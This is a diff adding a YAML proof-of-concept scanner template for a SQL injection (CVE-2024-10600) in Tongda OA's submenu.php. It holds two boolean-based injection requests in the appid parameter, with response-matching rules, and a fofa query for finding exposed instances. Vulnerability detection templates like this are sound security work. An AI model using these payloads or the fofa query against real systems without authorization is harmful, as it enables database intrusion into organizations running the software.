@@ -1,0 +1,21 @@
+id: poc-yaml-tongda-oa-submenu-sqli
+info:
+  name: 通达OA submenu.php sqi注入 (CVE-2024-10600)
+  severity: medium
+  tags:
+  - 两高一弱
+  - sql-injection
+  - CVE-2024-10600
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /pda/appcenter/submenu.php?appid=1+and+1%3da
+  expression: "status_code == 200 && (\n  (\n  contains(gbk_decode(body),\"错误，请联系管理员\"\
+    ) \n  ) || (\n  contains(body,\"错误，请联系管理员\") \n  )\n)\n"
+- method: GET
+  path: /pda/appcenter/submenu.php?appid=1+and+1%3d1
+  expression: "status_code == 200 && (\n  (\n  contains(gbk_decode(body),\"用户未登录\"\
+    ) \n  ) || (\n  contains(body,\"用户未登录\") \n  )\n)\n"
+variables: {}
+transport: http
